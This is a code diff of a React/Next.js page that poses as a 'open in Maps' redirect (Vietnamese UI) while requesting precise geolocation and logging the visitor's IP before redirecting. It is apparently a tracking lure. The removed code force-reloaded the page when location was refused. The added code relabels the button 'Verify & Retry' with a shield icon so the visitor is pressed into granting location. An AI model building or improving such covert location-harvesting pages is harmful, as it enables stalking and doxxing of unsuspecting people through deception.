@@ -3,7 +3,7 @@
 import { useState } from 'react';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
-import { MapPin, ArrowUpRight, Loader2, AlertTriangle } from 'lucide-react';
+import { MapPin, ArrowUpRight, Loader2, ShieldCheck } from 'lucide-react';
 import type { MapLinkConfig } from '@/app/actions/map-links';
 
 interface MapRedirectClientProps {
@@ -12,13 +12,10 @@ interface MapRedirectClientProps {
 }
 
 export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
-  const [isLoading, setIsLoading] = useState(false);
-  const [errorState, setErrorState] = useState(false);
-  const [statusText, setStatusText] = useState('Mở trong ứng dụng Bản đồ');
+  const [status, setStatus] = useState<'idle' | 'loading' | 'denied'>('idle');
 
-  const handleOpenMap = () => {
-    setIsLoading(true);
-    setStatusText('Đang xử lý...');
+  const handleAction = () => {
+    setStatus('loading');
 
     const requestLocation = async () => {
       let clientIp = 'N/A';
@@ -52,33 +49,52 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
 
       const handleError = (error: GeolocationPositionError) => {
         if (error.code === error.PERMISSION_DENIED) {
-            setIsLoading(false);
-            setErrorState(true);
-            setStatusText('Yêu cầu bị từ chối, đang tải lại...');
-            // Reload the page after a delay to force the user to try again
-            setTimeout(() => {
-                window.location.reload();
-            }, 2500);
+            setStatus('denied');
         } else {
-            // For other errors, just log IP and redirect
             logDataAndRedirect();
         }
       };
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          logDataAndRedirect, // Success
-          handleError,        // Error
+          logDataAndRedirect,
+          handleError,
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
-        logDataAndRedirect(); // Geolocation not supported
+        logDataAndRedirect();
       }
     };
     
-    // Slight delay to allow UI to update before potential blocking from geolocation prompt
     setTimeout(requestLocation, 100);
   };
+  
+  const getButtonContent = () => {
+    switch(status) {
+      case 'loading':
+        return (
+          <>
+            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+            Đang xử lý...
+          </>
+        );
+      case 'denied':
+        return (
+          <>
+            <ShieldCheck className="mr-2 h-5 w-5" />
+            Xác minh & Thử lại
+          </>
+        );
+      case 'idle':
+      default:
+        return (
+          <>
+            <ArrowUpRight className="mr-2 h-5 w-5" />
+            Mở trong ứng dụng Bản đồ
+          </>
+        );
+    }
+  }
   
   return (
     <div className="flex flex-col min-h-screen bg-background">
@@ -111,14 +127,11 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
         {/* Footer Action Button */}
         <div className="bg-background p-4 border-t sticky bottom-0">
           <Button 
-            className={`w-full h-12 text-base font-semibold ${errorState ? 'bg-destructive hover:bg-destructive/90' : ''}`}
-            onClick={handleOpenMap}
-            disabled={isLoading || errorState}
+            className={`w-full h-12 text-base font-semibold ${status === 'denied' ? 'bg-primary' : ''}`}
+            onClick={handleAction}
+            disabled={status === 'loading'}
           >
-            {isLoading && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
-            {errorState && <AlertTriangle className="mr-2 h-5 w-5" />}
-            {!isLoading && !errorState && <ArrowUpRight className="mr-2 h-5 w-5" />}
-            {statusText}
+            {getButtonContent()}
           </Button>
         </div>
       </div>
